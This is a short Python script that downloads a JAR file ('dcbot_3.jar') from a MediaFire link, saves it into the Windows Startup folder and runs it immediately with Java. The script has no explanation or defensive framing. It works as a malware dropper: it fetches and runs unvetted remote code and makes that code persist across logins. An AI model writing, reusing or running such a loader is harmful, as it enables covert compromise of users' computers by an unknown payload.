import urllib.request
import subprocess
import os




url = "https://download1522.mediafire.com/a40cz69giucgWvXw3z_rn5cYnb0X_1KO64RumKfQHn2Ra-J6K4ylF3v0NwlTcdtSqfV1dRKdl2H8GPjqokhObttX3hOu/9frt7p6z242t7q4/dcbot_3.jar"
filename = "dcbot_3.jar"
startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
filepath = os.path.join(startup_path, filename)
response = urllib.request.urlopen(url)
with open(filepath, 'wb') as out_file:
    data = response.read()
    out_file.write(data)
subprocess.call(["java", "-jar", filepath], cwd=startup_path)

